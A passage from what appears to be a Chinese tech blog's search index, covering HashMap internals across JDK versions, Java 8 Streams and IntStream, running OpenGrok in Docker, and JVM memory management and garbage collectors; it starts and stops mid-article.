null\n\n当key为null时，放到table[0]中，只能有一个 key 为 null 的键值对放到哈希表中\n\n```java\nprivate V getForNullKey() {\n    if (size == 0) {\n        return null;\n    }\n    for (Entry<K,V> e = table[0]; e != null; e = e.next) {\n        if (e.key == null)\n            return e.value;\n    }\n    return null;\n}\n```\n\n【8】添加 Entry\n\n当 size 大于threshold时，会发生扩容。threshold 等于 capacity*load factor。\n\njdk7 中 resize，只有当 size >= threshold 并且 table 中的那个槽中已经有 Entry 时，才会发生 resize。即有可能虽然 size>=threshold，但是必须等到每个槽都至少有一个 Entry 时，才会扩容。扩容容量变成 2 倍。\n\n```java\nvoid addEntry(int hash, K key, V value, int bucketIndex) {\n    if ((size >= threshold) && (null != table[bucketIndex])) {\n        resize(2 * table.length);\n        hash = (null != key) ? hash(key) : 0;\n        bucketIndex = indexFor(hash, table.length);\n    }\n\n    createEntry(hash, key, value, bucketIndex);\n}\n```\n\n【9】为什么容量必须是 2 的整数次幂\n\n找下标的时候，是这样的 \n\n```java\nreturn h & (length-1);\n```\n\n也就是说，比如容量是 16\n\n```\n16       0001 0000\n15       0000 1111\nh        0001 0100\nindex    0000 0100\n```\n\n这样的话就相当于是每一位都和1做与运算，得到的数值正好在 0-15 之间。\n\n【10】getEntry get\n\nget() 调用了 getEntry()\n\n```java\nfinal Entry<K,V> getEntry(Object key) {\n    if (size == 0) {\n        return null;\n    }\n\n    int hash = (key == null) ? 0 : hash(key); // 计算 hash\n    for (Entry<K,V> e = table[indexFor(hash, table.length)];\n            e != null;\n            e = e.next) {\n        Object k;\n        // 遍历\n        if (e.hash == hash &&\n            ((k = e.key) == key || (key != null && key.equals(k))))\n            return e;\n    }\n    return null;\n}\n```\n\n【11】resize()\n\n```java\nvoid resize(int newCapacity) {\n    Entry[] oldTable = table;\n    int oldCapacity = oldTable.length;\n    if (oldCapacity == MAXIMUM_CAPACITY) {\n        threshold = Integer.MAX_VALUE;\n        return;\n    }\n\n    Entry[] newTable = new Entry[newCapacity];\n    transfer(newTable, initHashSeedAsNeeded(newCapacity));\n    table = newTable;\n    threshold = (int)Math.min(newCapacity * loadFactor, MAXIMUM_CAPACITY + 1);\n}\n\nvoid transfer(Entry[] newTable, boolean rehash) {\n    int newCapacity = newTable.length;\n    for (Entry<K,V> e : table) {\n        while(null != e) {\n            Entry<K,V> next = e.next;\n            if (rehash) {\n                e.hash = null == e.key ? 0 : hash(e.key);\n            }\n            int i = indexFor(e.hash, newCapacity);\n            e.next = newTable[i];\n            newTable[i] = e;\n            e = next;\n        }\n    }\n}\n```\n\n#### JDK 1.8\n\n接下来看 JDK 1.8\n\n\n```java\nstatic final int TREEIFY_THRESHOLD = 8;\n\nstatic final int UNTREEIFY_THRESHOLD = 6;\n\nstatic final int MIN_TREEIFY_CAPACITY = 64;\n```\n\nJDK 1.8 中引入了红黑树这个数据结构，当哈希冲突的链表 size 大小超过 TREEIFY_THRESHOLD 的时候，就会变成红黑树，这样查找的速度就会变快。当元素被删除，红黑树节点数量小于 UNTREEIFY_THRESHOLD 的时候，就会转换成链表。\n\n1.8 中元素从 Entry 变成了 Node\n\n```java\n\nstatic class Node<K,V> implements Map.Entry<K,V> {\n    final int hash;\n    final K key;\n    V value;\n    Node<K,V> next;\n}\n```\n\nput 的操作也复杂了很多\n\n```java\nfinal V putVal(int hash, K key, V value, boolean onlyIfAbsent,\n                   boolean evict) {\n    Node<K,V>[] tab; Node<K,V> p; int n, i;\n    if ((tab = table) == null || (n = tab.length) == 0)\n        n = (tab = resize()).length;\n    if ((p = tab[i = (n - 1) & hash]) == null) \n        // 跟 JDK1.7 比简化了操作，取消了 indexFor 方法，扰动改为一次，JDK 1.7 是4次\n        tab[i] = newNode(hash, key, value, null);\n    else {\n        Node<K,V> e; K k;\n        if (p.hash == hash &&\n            ((k = p.key) == key || (key != null && key.equals(k))))\n            e = p;\n        else if (p instanceof TreeNode) // 判断是树还是链表\n            e = ((TreeNode<K,V>)p).putTreeVal(this, tab, hash, key, value);\n        else {\n            for (int binCount = 0; ; ++binCount) {\n                // 哈希冲突而且是链表的情况下直接放在后面，反正他也要遍历一遍\n                if ((e = p.next) == null) {\n                    p.next = newNode(hash, key, value, null);\n                    if (binCount >= TREEIFY_THRESHOLD - 1) // -1 for 1st\n                        treeifyBin(tab, hash);\n                    break;\n                }\n                if (e.hash == hash &&\n                    ((k = e.key) == key || (key != null && key.equals(k))))\n                    break;\n                p = e;\n            }\n        }\n        if (e != null) { // existing mapping for key\n            V oldValue = e.value;\n            if (!onlyIfAbsent || oldValue == null)\n                e.value = value;\n            afterNodeAccess(e);\n            return oldValue;\n        }\n    }\n    ++modCount;\n    if (++size > threshold)\n        resize();\n    afterNodeInsertion(evict);\n    return null;\n}\n```\n\n根据期望容量cap，返回2的n次方形式的 哈希桶的实际容量 length。 返回值一般会>=cap \n\n```java \nstatic final int tableSizeFor(int cap) {\n//经过下面的 或 和 位移 运算， n最终各位都是1。\n    int n = cap - 1;\n    n |= n >>> 1;\n    n |= n >>> 2;\n    n |= n >>> 4;\n    n |= n >>> 8;\n    n |= n >>> 16;\n    //判断n是否越界，返回 2的n次方作为 table（哈希桶）的阈值\n    return (n < 0) ? 1 : (n >= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + 1;\n}\n```\n\n这篇文章分析的比较全 \n[https://blog.csdn.net/zxt0601/article/details/77413921](https://blog.csdn.net/zxt0601/article/details/77413921)\n\n#### JDK 11\n\n```java\nstatic final int tableSizeFor(int cap) {\n    int n = -1 >>> Integer.numberOfLeadingZeros(cap - 1);\n    return (n < 0) ? 1 : (n >= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + 1;\n}\n```","categories":["java"],"tags":["java"]},{"title":"Java8 从 循环（Loops） 到 流（Stream）","url":"/2019/01/2019-01-29-java-no-more-loops-and-use-stream/","content":"\n这篇文章是是我看到的几篇文章的总结。\n\nJava8 里函数式编程的特性被引入已经成为了这场游戏的转折点。是时候学习一下了。流是函数式编程引入的一大特性\n\n<!-- more -->\n\n![29-18-02-java8-g1eFWS](https://up-img.yonghong.tech/pic/2021/07/29-18-02-java8-g1eFWS.png)\n\n下面我们来一起看一下流的引入能够给我们带来怎样的效果。\n\nLet the coding begin!\n\n首先我们有一个 Article 类，有属性 title，author，和 tags\n\n```java\nprivate class Article {\n\n    private final String title;\n    private final String author;\n    private final List<String> tags;\n\n    private Article(String title, String author, List<String> tags) {\n        this.title = title;\n        this.author = author;\n        this.tags = tags;\n    }\n\n    public String getTitle() {\n        return title;\n    }\n\n    public String getAuthor() {\n        return author;\n    }\n\n    public List<String> getTags() {\n        return tags;\n    }\n}\n```\n\n下面每一个示例都包含传统的 for 循环和新的 stream 的用法\n\n#### 1.找出集合中第一篇包含标签 \"Java\" 的文章\n\n传统 for 循环\n\n```java\npublic Article getFirstJavaArticle() {\n\n    for (Article article : articles) {\n        if (article.getTags().contains(\"Java\")) {\n            return article;\n        }\n    }\n\n    return null;\n}\n```\n\n现在我们来用 Stream Api 尝试一下\n\n```java\npublic Optional<Article> getFirstJavaArticle() {  \n    return articles.stream()\n        .filter(article -> article.getTags().contains(\"Java\"))\n        .findFirst();\n}\n```\n\n是不是很 cool，首先我们使用 filter 来筛选出 tags 中包含 \"Java\" 的文章，然后我们用 findFirst() 来找出第一个出现的。实际上流是很懒的，他只需要找出一个来，后面就不再处理了。\n\n#### 2.现在我们要匹配所有的元素，而不仅仅是第一个了。\n\n首先，传统的 for 循环\n\n```java\npublic List<Article> getAllJavaArticles() {\n\n    List<Article> result = new ArrayList<>();\n\n    for (Article article : articles) {\n        if (article.getTags().contains(\"Java\")) {\n            result.add(article);\n        }\n    }\n\n    return result;\n}\n```\n\nStream 操作\n\n```java\npublic List<Article> getAllJavaArticles() {  \n    return articles.stream()\n        .filter(article -> article.getTags().contains(\"Java\"))\n        .collect(Collectors.toList());\n}\n```\n\ncool，几乎和上面一样的操作，而且我们并不需要显式的声明一个 List，并且在符合条件的时候 add。Stream 提供了一个非常优雅的收集符合条件元素的办法 collect(Collectors.toList())。\n\n到目前为止还没有很惊艳的操作，我们来尝试一下更加惊艳的操作！\n\n#### 3.根据作者分组\n\n首先还是传统的办法\n\n```java\npublic Map<String, List<Article>> groupByAuthor() {\n\n    Map<String, List<Article>> result = new HashMap<>();\n\n    for (Article article : articles) {\n        if (result.containsKey(article.getAuthor())) {\n            result.get(article.getAuthor()).add(article);\n        } else {\n            ArrayList<Article> articles = new ArrayList<>();\n            articles.add(article);\n            result.put(article.getAuthor(), articles);\n        }\n    }\n\n    return result;\n}\n```\n\n那我们能不能用 Stream 做的更简单呢\n\n```java\npublic Map<String, List<Article>> groupByAuthor() {  \n    return articles.stream()\n        .collect(Collectors.groupingBy(Article::getAuthor));\n} \n```\n\n炒鸡棒啊，我们用了 groupingBy() 和 getAuthor 这个引用，就完成了这么复杂的操作并且简洁清晰，可读。\n\n#### 4.获取所有的标签\n\nfor 循环\n\n```java\npublic Set<String> getDistinctTags() {\n\n    Set<String> result = new HashSet<>();\n\n    for (Article article : articles) {\n        result.addAll(article.getTags());\n    }\n\n    return result;\n}\n```\n\nStream \n\n```java\npublic Set<String> getDistinctTags() {  \n    return articles.stream()\n        .flatMap(article -> article.getTags().stream())\n        .collect(Collectors.toSet());\n}\n```\n\nflatMap 给我们提供了一种去重的简单办法。\n\n这仅仅是表面而已，我们还有更高级的用法，比如并行等操作。\n\n接下来我还要继续讲解一下如何改变我们以前写的 for (int i=0;... 循环\n\n这个东西就是 IntStream \n\nIntStream 是原始类型 int 的 stream。这样的好处就是减少了拆箱装箱的操作。他是 java.util.stream 包里的，当然这个包里也有处理 double, long 等类型对应的 stream。他们原理是一样的不再赘述。\n\n#### 5.创建 IntStream \n\n创建 IntStream 有很多中办法\n\n其一是使用 of()\n\n```java\nIntStream.of(1, 2, 3);  \n// > 1, 2, 3\n```\n\n这样创建好之后我们可以直接使用 forEach() 打印出这些数字，就像前面说到的 Stream 的用法一样。\n\n```java\nIntStream.of(1, 2, 3).forEach(System.out::println);\n```\n\n\n其二是使用 range() 或者 rangeClosed()\n\n```java\nIntStream.range(1, 3);  \n// > 1, 2 左闭右开\nIntStream.rangeClosed(1, 3);  \n// > 1, 2, 3 左闭右也闭\n```\n\n那如果我们使用偶数怎么办，也简单\n\n```java\nIntStream.iterate(0, i -> i + 2).limit(3);  \n// > 0, 2, 4\n```\n\niterate(0, i -> i + 2) 创建了一个无限流，limit(3) 限制了数量是3\n\n最后一个要介绍的是 generate()\n\n```java\nIntStream.generate(() -> ThreadLocalRandom.current().nextInt(10)).limit(3);  \n// > 4, 1, 7\n```\n\ngenerate() 很像 iterator，但是又不根据前一个元素去计算\n\n#### 6.关于 IntStream 更多的玩法\n\n使用 map()\n\n```java\nIntStream.range(1, 5).map(i -> i * i);\n// > 1, 4, 9, 16\n```\n\n如果我们需要得到其他类型的流怎么办\n\n```java\nStream<Color> stream = IntStream.range(1, 5).mapToObj(i -> getColor(i));\nStream<String> stream = IntStream.range(1,10).mapToObj(i -> \"\" + i);\n```\n\nJava 编程思想中作者提到，原始的 foreach 中，使用 range 会降低效率\n\n```java\npublic class ForEachInt {\n\n    public static int[] range(int start,int end,int step) {\n        int sz =(end - start) / step;\n        int[] result = new int[sz];\n        for(int i = 0; i < sz; i++) {\n            result[i] = start + (i * step);\n        }\n        return result;\n    }\n\n    public static int[] range(int start, int end) {\n        return range(start, end, 1);\n    }\n\n    public static int[] range(int end) {\n        return range(0, end);\n    }\n\n    public static void main(String[] args) {\n        int n = 100000;\n        Long start, end;\n        start = System.currentTimeMillis();\n        for (int i = 0; i < n; i++) {\n        }\n        end = System.currentTimeMillis();\n        Long s0 = end - start;\n\n        start = System.currentTimeMillis();\n        for (int i : range(n)) {\n        }\n        end = System.currentTimeMillis();\n        Long s1 = end - start;\n\n        start = System.currentTimeMillis();\n        IntStream.range(0, n).forEach(i -> {});\n        end = System.currentTimeMillis();\n        Long s2 = end - start;\n\n        System.out.println(\"s0 = \" + s0);\n        System.out.println(\"s1 = \" + s1);\n        System.out.println(\"s2 = \" + s2);\n    }\n}\n```\n\n经过测试\n\n```\nn = 100000\ns0 = 1\ns1 = 5\ns2 = 72\n\nn = 1000000\ns0 = 3\ns1 = 13\ns2 = 65\n\nn = 10000000\ns0 = 4\ns1 = 37\ns2 = 63\n\nn = 100000000\ns0 = 3\ns1 = 295\ns2 = 67\n\nn = 500000000\ns0 = 3\ns1 = 2921\ns2 = 63\n```\n\nIntStream 一直很稳定，for(int i = 0; i < n; i++ ) 比 for(int i : range(n)) 要快很多\n\n\n使用 boxed() 方法 将 IntStream 转换成 Stream<Integer>，因为 IntStream 是原始类型的 int 的 Stream\n\n```java\nStream<Integer> stream = IntStream.range(1, 5).boxed();  \n```\n\n还可以这样，DoubleStream 和 LongStream 也是原始类型的流 double 和 long\n\n```java\nDoubleStream stream = IntStream.range(1, 5).mapToDouble(i -> i);\nLongStream stream = IntStream.range(1, 5).mapToLong(i -> i);  \n```\n\n使用 anyMatch() 判断至少有一个偶数\n\n```java\nIntStream.range(1, 5).anyMatch(i -> i % 2 == 0);  \n// 返回 true\n```\n\n还有 \n\n```java\nIntStream.range(1, 5).allMatch(i -> i % 2 == 0);  \n// > false\n\nIntStream.range(1, 5).noneMatch(i -> i % 2 == 0);  \n// > false\n```\n\n继续 filter\n\n```java\nIntStream.range(1, 5)  \n    .filter(i -> i % 2 == 0)\n    .allMatch(i -> i % 2 == 0);\n// > true\n\nIntStream.range(1, 5)  \n    .filter(i -> i % 2 == 0)\n    .noneMatch(i -> i % 2 != 0);\n// > true\n```\n\n获取最大最小值\n\n```java\nIntStream.range(1, 5).max().getAsInt();  \n// > 4\nIntStream.range(1, 5).min().getAsInt();  \n// > 1\n```\n返回类型是 OptionalInt，就像是 Optional 一样，可以返回 null。这个部分单独讨论\n\n接下来，excellent reduce function\n\n```java\nIntStream.range(1, 5).reduce(1, (x, y) -> x * y)  \n// > 24 连乘\n```\n\n并行\n\n```java\nIntStream.range(1, 5).parallel().forEach(i -> heavyOperation());  \n```\n\nheavyOperation() 可以是一些费时的操作，这样就可以进行并行计算了\n\n哇，写了这么多！\n\n无限可能。Java11 应该更厉害\n\n---\n\n### 参考文献 \n\n[Java 8: No more loops](https://www.deadcoderising.com/java-8-no-more-loops/)\n\n[Java 8: Replace traditional for loops with IntStreams](https://www.deadcoderising.com/2015-05-19-java-8-replace-traditional-for-loops-with-intstreams/)\n\n[https://docs.oracle.com/javase/8/docs/api/java/util/stream/package-summary.html](https://docs.oracle.com/javase/8/docs/api/java/util/stream/package-summary.html)","categories":["java"],"tags":["java"]},{"title":"使用 OpenGrok 阅读优秀开源代码","url":"/2019/02/2019-02-01-read-source-code-with-opengrok/","content":"\nOpenGrok is a fast and usable source code search and cross reference engine, written in Java\n\nOpenGrok 的项目地址是 [https://github.com/oracle/opengrok](https://github.com/oracle/opengrok)\n\nOpenGrok 还提供了 docker 的安装方式 [https://hub.docker.com/r/opengrok/docker/](https://hub.docker.com/r/opengrok/docker/)\n\n<!-- more -->\n\n安装运行：\n\nThe container exports ports 8080 for OpenGrok.\n\n```shell\ndocker run -d -v :/src -p 8080:8080 opengrok/docker:latest\n```\n\nThe volume mounted to /src should contain the projects you want to make searchable (in sub directories). You can use common revision control checkouts (git, svn, etc...) and OpenGrok will make history and blame information available.\n\nBy default, the index will be rebuild every ten minutes. You can adjust this time (in Minutes) by passing the REINDEX environment variable:\n\n```shell\ndocker run -d -e REINDEX=30 -v :/src -p 8080:8080 opengrok/docker:latest\n```\n\nSetting REINDEX to 0 will disable automatic indexing. You can manually trigger an reindex using docker exec:\n\n```shell\ndocker exec /scripts/index.sh\n```","categories":["opensource"],"tags":["opensource"]},{"title":"深入理解 Java 虚拟机","url":"/2019/02/2019-02-02-java-jvm/","content":"\n### Java 虚拟机内存管理\n\n运行时数据区包含线程共享区和线程独占区\n- 线程共享区包含 1.方法区（存储运行时常量池，已被虚拟机加载的类信息，常量，静态变量，即时编译器编译后的代码等数据）2.Java堆（存储对象实例）\n- 线程独占区 1.虚拟机栈（存储方法运行时所需的数据） 2.本地方法栈（JVM 调用的 native 方法） 3.程序计数器（记录当前线程所执行到的字节码的行号）\n\n<!-- more -->\n\n程序计数器\n\n- 程序计数器是一块较小的内存空间，它可以看做是当前线程所执行的字节码的行号指示器\n- 程序计数器处于线程独占区\n- 如果线程执行的是 Java 方法，这个计数器记录的是正在执行的虚拟机字节码指令的地址。如果正在执行的是 native 方法，这个计数器的值为 undefined\n- 此区域是唯一一个在 Java 虚拟机规范中没有规定任何 OutOfMemoryError 情况的区域\n\nJava 虚拟机栈\n\n- 虚拟机栈描述的是 Java 方法执行的动态内存模型\n- 栈帧：\n  - 每个方法执行，都会创建一个栈帧，伴随着方法从创建到执行完成。用于存储局部变量表，操作数栈，动态链接，方法出口等\n- 局部变量表：\n  - 存放编译期可知的各种基本数据类型，引用类型，returnAddress 类型。\n  - 局部变量表的内容空间在编译器完成分配，当进入一个方法时，这个方法需要在帧分配多少内存是固定的，在方法运行期间是不会改变局部变量表的大小\n- 大小超出的时候 StackOverflowError OutofMemoryException\n\n本地方法栈\n\n- 虚拟机栈为虚拟机执行 Java 方法服务，本地方法栈为虚拟机执行 native 方法服务\n- HotSpot 虚拟机是将本地方法栈和虚拟机栈合在一起的\n\nJava 堆\n\n- 存放对象实例\n- 垃圾收集器管理的主要区域\n- 新生代，老生代，Eden 空间\n\n方法区\n- 存储虚拟机加载的类信息，常量，静态变量，静态常量，即时编译器编译后的代码等数据\n  - 类的版本，字段，方法，接口等\n- 方法区和永久代（有人称方法区为永久代，HotSpot JDK用永久代实现方法区，别的虚拟机不存在永久代的概念）\n- 垃圾回收在方法区的行为（回收效率比较低），针对常量池的回收，类型卸载\n- 异常 OutOfMemory\n\n运行时常量池（方法区的一部分）\n- 运行时常量池运行时常量池（Runtime Constant Pool），它是方法区的一部分。Class文件中除了有类的版本、字段、方法、接口等描述等信息外，还有一项信息是常量池（Constant Pool Table），用于存放编译期生成的各种字面量和符号引用，这部分内容将在类加载后存放到常量池中。\n- 运行时常量是相对于常量来说的，它具备一个重要特征是：动态性。当然，值相同的动态常量与我们通常说的常量只是来源不同，但是都是储存在池内同一块内存区域。Java语言并不要求常量一定只能在编译期产生，运行期间也可能产生新的常量，这些常量被放在运行时常量池中。这里所说的常量包括：基本类型包装类（包装类不管理浮点型，整形只会管理-128到127）和String（也可以通过String.intern()方法可以强制将String放入常量池）\n- 运行时常量池在JDK1.6及之前版本的JVM中是方法区的一部分，而在HotSpot虚拟机中方法区放在了”永久代(Permanent Generation)”。所以运行时常量池也是在永久代的。\n- 但是JDK1.7及之后版本的JVM已经将运行时常量池从方法区中移了出来，在Java 堆（Heap）中开辟了一块区域存放运行时常量池。\n\n直接内存\n- 直接内存并不是虚拟机运行时数据区的一部分，也不是Java 虚拟机规范中农定义的内存区域。在JDK1.4 中新加入了NIO(New Input/Output)类，引入了一种基于通道(Channel)与缓冲区（Buffer）的I/O 方式，它可以使用native 函数库直接分配堆外内存，然后通过一个存储在Java堆中的DirectByteBuffer 对象作为这块内存的引用进行操作。这样能在一些场景中显著提高性能，因为避免了在Java堆和Native堆中来回复制数据。\n- 本机直接内存的分配不会受到Java 堆大小的限制，受到本机总内存大小限制\n- 配置虚拟机参数时，不要忽略直接内存 防止出现OutOfMemoryError异常\n\n直接内存（堆外内存）与堆内存比较\n- 直接内存申请空间耗费更高的性能，当频繁申请到一定量时尤为明显\n- 直接内存IO读写的性能要优于普通的堆内存，在多次读写操作的情况下差异明显\n\n### 对象的创建\n\nnew 类名 -> 根据 new 的参数在常量池中定位一个类的符号引用 -> 如果没有找到这个符号引用，说明类还没有被加载，则进行类的加载、解析和初始化 -> 虚拟机为对象分配内存（位于堆中） -> 将分配的内存初始化为零值（不包括对象头） -> 调用对象的 init 方法\n\n1.给对象分配内存\n- 指针碰撞\n- 空闲列表\n2.线程安全性问题\n- 线程同步（效率不高）\n- 本地线程分配缓冲\n3.初始化对象\n4.执行构造方法\n\n### 对象的结构\n\n对象的结构\n- Header （对象头） \n  - 自身运行时数据（Mark Word）\n    - （哈希值，Object 类里 hashCode 方法是 native 方法；GC 分代年龄；锁状态标志；线程持有的锁；偏向线程 ID；偏向时间戳；大小根据系统不同分别占 32位 和 64位）\n  - 类型指针\n- Instance Data\n  - long double short/char 根据大小放在一起\n- Padding\n  - 占位符，8个字节的整数倍\n\n![29-18-04-ScreenShot2019-02-02at8.13.19PM-30V6Cr](https://up-img.yonghong.tech/pic/2021/07/29-18-04-Screen%20Shot%202019-02-02%20at%208.13.19%20PM-30V6Cr.png)\n\n### 对象的访问定位\n\n- 使用句柄\n  - 句柄池，引用地址可以不用变\n- 直接指针（HotSpot）\n  - 性能高，减少一次寻址\n\n### 垃圾回收\n\n要解决的问题\n\n1.如何判断对象为垃圾对象\n- 引用计数法\n- 可达性分析法 \n\n2.如何回收\n- 回收策略（标记清除，复制算法，标记整理算法，分代收集算法）\n- 常见的垃圾回收器（serial，Parnew，CMS，G1）\n\n3.何时回收\n\n打印垃圾回收信息 JVM 参数 -verbose:gc -XX:+PrintGCDetails\n\n\n引用计数算法\n- 在对象中添加一个引用计数器，当有地方引用这个对象的时候，引用计数器的值就+1，当引用失效的时候，计数器的值就-1\n- 无法解决循环引用\n\n```java\npublic class Test {\n\n    private Object instance;\n\n    public static void main(String[] args) {\n        Test test1 = new Test();\n        Test test2 = new Test();\n\n        test1.instance = test2;\n        test2.instance = test1;\n\n        test1 = null;\n        test2 = null;\n    }\n}\n```\n\n可达性分析算法\n- 作为 GC root 的对象：虚拟机栈（局部变量表），方法区的类属性所引用的对象，方法区中常量所引用的对象，本地方法栈中引用的对象\n\n标记清除算法\n- 标记-清除算法采用从根集合进行扫描，对存活的对象对象标记，标记完毕后，再扫描整个空间中未被标记的对象，进行回收，如上图所示。标记-清除算法不需要进行对象的移动，并且仅对不存活的对象进行处理，在存活对象比较多的情况下极为高效，但由于标记-清除算法直接回收不存活的对象，因此会造成内存碎片。\n\n复制算法\n\n- 该算法的提出是为了克服句柄的开销和解决堆碎片的垃圾回收。它开始时把堆分成一个对象面和多个空闲面，程序从对象面为对象分配空间，当对象满了，基于复制算法的垃圾收集就从根集中扫描活动对象，并将每个活动对象复制到空闲面(使得活动对象所占的内存之间没有空闲洞)，这样空闲面变成了对象面，原来的对象面变成了空闲面，程序会在新的对象面中分配内存。一种典型的基于复制算法的垃圾回收是 stop-and-copy 算法，它将堆分成对象面和空闲区域面，在对象面与空闲区域面的切换过程中，程序暂停执行。\n- 堆 \n  - 新生代\n    - Eden 区 伊甸园\n    - Survivor 存活区 \n    - Tenured Gen\n  - 老年代\n- 方法区\n- 栈 本地方法栈 程序计数器\n\n标记整理算法\n- 标记-整理算法采用标记-清除算法一样的方式进行对象的标记，但在清除时不同，在回收不存活的对象占用的空间后，会将所有的存活对象往左端空闲空间移动，并更新对应的指针。标记-整理算法是在标记-清除算法的基础上，又进行了对象的移动，因此成本更高，但是却解决了内存碎片的问题。在基于Compacting算法的收集器的实现中，一般增加句柄和句柄表。\n\n分代收集算法\n- 分代的垃圾回收策略，是基于这样一个事实：不同的对象的生命周期是不一样的。因此，不同生命周期的对象可以采取不同的回收算法，以便提高回收效率。\n- 年轻代（Young Generation）选择复制算法\n  - 1.所有新生成的对象首先都是放在年轻代的。年轻代的目标就是尽可能快速的收集掉那些生命周期短的对象。\n  - 2.新生代内存按照8:1:1的比例分为一个eden区和两个survivor(survivor0,survivor1)区。一个Eden区，两个 Survivor区(一般而言)。大部分对象在Eden区中生成。回收时先将eden区存活对象复制到一个survivor0区，然后清空eden区，当这个survivor0区也存放满了时，则将eden区和survivor0区存活对象复制到另一个survivor1区，然后清空eden和这个survivor0区，此时survivor0区是空的，然后将survivor0区和survivor1区交换，即保持survivor1区为空，如此往复。\n  - 3.当survivor1区不足以存放 eden和survivor0的存活对象时，就将存活对象直接存放到老年代。若是老年代也满了就会触发一次Full GC，也就是新生代、老年代都进行回收\n  - 4.新生代发生的GC也叫做Minor GC，MinorGC发生频率比较高(不一定等Eden区满了才触发)\n- 年老代（Old Generation）选择标记整理算法\n  - 1.在年轻代中经历了N次垃圾回收后仍然存活的对象，就会被放到年老代中。因此，可以认为年老代中存放的都是一些生命周期较长的对象。\n  - 2.内存比新生代也大很多(大概比例是1:2)，当老年代内存满时触发Major GC即Full GC，Full GC发生频率比较低，老年代对象存活时间比较长，存活率标记高。\n- 持久代（Permanent Generation）\n  - 用于存放静态文件，如Java类、方法等。持久代对垃圾回收没有显著影响，但是有些应用可能动态生成或者调用一些class，例如Hibernate 等，在这种时候需要设置一个比较大的持久代空间来存放这些运行过程中新增的类。\n\n### 垃圾收集器\n\n[https://crowhawk.github.io/2017/08/15/jvm_3/](https://crowhawk.github.io/2017/08/15/jvm_3/)\n\n如果说收集算法是内存回收的方法论，那么垃圾收集器就是内存回收的具体实现。Java虚拟机规范中对垃圾收集器应该如何实现并没有任何规定，因此不同的厂商、版本的虚拟机所提供的垃圾收集器都可能会有很大差别，并且一般都会提供参数供用户根据自己的应用特点和要求组合出各个年代所使用的收集器。接下来讨论的收集器基于JDK1.7 Update 14 之后的HotSpot虚拟机（在此版本中正式提供了商用的G1收集器，之前G1仍处于实验状态），该虚拟机包含的所有收集器如下图所示：\n\n![29-18-05-gc-WhQFdg](https://up-img.yonghong.tech/pic/2021/07/29-18-05-gc-WhQFdg.jpg)\n\n上图展示了7种作用于不同分代的收集器，如果两个收集器之间存在连线，就说明它们可以搭配使用。虚拟机所处的区域，则表示它是属于新生代收集器还是老年代收集器。Hotspot实现了如此多的收集器，正是因为目前并无完美的收集器出现，只是选择对具体应用最适合的收集器。\n\n相关概念\n\n并行和并发\n- 并行（Parallel）：指多条垃圾收集线程并行工作，但此时用户线程仍然处于等待状态。\n- 并发（Concurrent）：指用户线程与垃圾收集线程同时执行（但不一定是并行的，可能会交替执行），用户程序在继续运行。而垃圾收集程序运行在另一个CPU上。\n  \n吞吐量（Throughput）\n- 吞吐量就是CPU用于运行用户代码的时间与CPU总消耗时间的比值，即\n- 吞吐量 = 运行用户代码时间 /（运行用户代码时间 + 垃圾收集时间）。\n- 假设虚拟机总共运行了100分钟，其中垃圾收集花掉1分钟，那吞吐量就是99%。\n\nMinor GC 和 Full GC\n- 新生代GC（Minor GC）：指发生在新生代的垃圾收集动作，因为Java对象大多都具备朝生夕灭的特性，所以Minor GC非常频繁，一般回收速度也比较快。具体原理见上一篇文章。\n- 老年代GC（Major GC / Full GC）：指发生在老年代的GC，出现了Major GC，经常会伴随至少一次的Minor GC（但非绝对的，在Parallel Scavenge收集器的收集策略里就有直接进行Major GC的策略选择过程）。Major GC的速度一般会比Minor GC慢10倍以上。\n\n#### 新生代收集器\n\nSerial 收集器\n- Serial（串行）收集器是最基本、发展历史最悠久的收集器，它是采用复制算法的新生代收集器，曾经（JDK 1.3.1之前）是虚拟机新生代收集的唯一选择。它是一个单线程收集器，只会使用一个CPU或一条收集线程去完成垃圾收集工作，更重要的是它在进行垃圾收集时，必须暂停其他所有的工作线程，直至Serial收集器收集结束为止（“Stop The World”）。这项工作是由虚拟机在后台自动发起和自动完成的，在用户不可见的情况下把用户正常工作的线程全部停掉，这对很多应用来说是难以接收的。\n- 下图展示了Serial 收集器（老年代采用Serial Old收集器）的运行过程：\n\n![29-18-06-gc-serial-LIPHIa](https://up-img.yonghong.tech/pic/2021/07/29-18-06-gc-serial-LIPHIa.png)\n\n- 为了消除或减少工作线程因内存回收而导致的停顿，HotSpot虚拟机开发团队在JDK 1.3之后的Java发展历程中研发出了各种其他的优秀收集器，这些将在稍后介绍。但是这些收集器的诞生并不意味着Serial收集器已经“老而无用”，实际上到现在为止，它依然是HotSpot虚拟机运行在Client模式下的默认的新生代收集器。它也有着优于其他收集器的地方：简单而高效（与其他收集器的单线程相比），对于限定单个CPU的环境来说，Serial收集器由于没有线程交互的开销，专心做垃圾收集自然可以获得更高的单线程收集效率。\n- 在用户的桌面应用场景中，分配给虚拟机管理的内存一般不会很大，收集几十兆甚至一两百兆的新生代（仅仅是新生代使用的内存，桌面应用基本不会再大了），停顿时间完全可以控制在几十毫秒最多一百毫秒以内，只要不频繁发生，这点停顿时间可以接收。所以，Serial收集器对于运行在Client模式下的虚拟机来说是一个很好的选择。\n\nParallel Scavenge 收集器\n- Parallel Scavenge收集器也是一个并行的多线程新生代收集器，它也使用复制算法。Parallel Scavenge收集器的特点是它的关注点与其他收集器不同，CMS等收集器的关注点是尽可能缩短垃圾收集时用户线程的停顿时间，而Parallel Scavenge收集器的目标是达到一个可控制的吞吐量（Throughput）。\n- 停顿时间越短就越适合需要与用户交互的程序，良好的响应速度能提升用户体验。而高吞吐量则可以高效率地利用CPU时间，尽快完成程序的运算任务，主要适合在后台运算而不需要太多交互的任务。\n- Parallel Scavenge收集器除了会显而易见地提供可以精确控制吞吐量的参数，还提供了一个参数-XX:+UseAdaptiveSizePolicy，这是一个开关参数，打开参数后，就不需要手工指定新生代的大小（-Xmn）、Eden和Survivor区的比例（-XX:SurvivorRatio）、晋升老年代对象年龄（-XX:PretenureSizeThreshold）等细节参数了，虚拟机会根据当前系统的运行情况收集性能监控信息，动态调整这些参数以提供最合适的停顿时间或者最大的吞吐量，这种方式称为GC自适应的调节策略（GC Ergonomics）。自适应调节策略也是Parallel Scavenge收集器与ParNew收集器的一个重要区别。\n- 另外值得注意的一点是，Parallel Scavenge收集器无法与CMS收集器配合使用，所以在JDK 1.6推出Parallel Old之前，如果新生代选择Parallel Scavenge收集器，老年代只有Serial Old收集器能与之配合使用。\n\n#### 老年代收集器\n\nSerial Old收集器\n- Serial Old 是 